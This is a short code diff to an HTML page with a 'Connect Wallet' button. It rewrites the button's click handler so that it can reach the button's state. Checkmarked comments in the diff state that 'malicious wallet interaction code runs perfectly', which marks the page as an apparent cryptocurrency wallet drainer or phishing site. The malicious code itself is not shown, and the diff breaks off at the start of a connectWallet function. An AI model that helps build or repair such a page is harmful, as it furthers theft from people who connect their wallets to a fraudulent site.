@@ -263,17 +263,22 @@
              <div class="wallet-display connect-wallet-btn">Connect Wallet</div>
 
 
+
             </div>
 
     </div>  
 
-<script>const connectButton = document.querySelector('.connect-wallet-btn');
+<script>const connectButton = document.querySelector('.connect-wallet-btn'); // ✅ Defined globally
 
 if (connectButton) {
   const originalText = connectButton.innerText;
 
   connectButton.onclick = async () => {
-    // 
+    // ✅ Now everything inside here can access `connectButton` and `originalText`
+    // ✅ Malicious wallet interaction code runs perfectly
+  };
+}
+
 
 async function connectWallet() {
 
